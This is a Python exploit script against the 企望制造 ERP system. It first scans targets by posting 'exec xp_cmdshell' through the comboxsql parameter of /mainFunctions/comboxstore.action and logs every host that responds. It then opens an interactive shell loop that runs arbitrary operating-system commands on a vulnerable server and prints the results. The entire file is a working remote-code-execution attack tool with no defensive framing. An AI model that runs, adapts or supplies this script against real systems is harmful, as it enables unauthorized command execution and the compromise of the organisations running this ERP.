import re

import requests
import time
import buter
import wirtefile

filename = "./reps/企望制造ERP-RCE-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
poc = "/mainFunctions/comboxstore.action"
data = {"comboxsql": f"exec xp_cmdshell 'whoami'"}
def QiWangerpRCE(url):
    try:
        # res = requests.post(url, headers=headers, data=data, timeout=5, verify=False).text
        reps = requests.post(url=url+poc, headers=headers, data=data, verify=False, timeout=5)
        if '"Value"' in reps.text:
                print(buter.colors.GREEN+  f"存在企望制造ERP_RCE url : {url}" + buter.colors.END)
                print(buter.colors.GREEN + f"Response : {reps.text}" + buter.colors.END)
                reptext = url + "\n" + reps.text
                wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现企望制造ERP_RCE url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)

#命令执行exp
def exp(target):
    while True:
        cmd = input("请输入你要执行的命令(q--->quit)\n>>>")
        if cmd == "q":
            exit()
        url = target + "/mainFunctions/comboxstore.action"
        data = {"comboxsql": f"exec xp_cmdshell '{cmd}'"}
        try:
            rep = requests.post(url,headers=headers,data=data,verify=False,timeout=5).text
            result = re.findall('''Value":"(.*?)"''',rep,re.S)[0]
            print(result)
        except:
            print("执行异常,请重新执行其它命令")
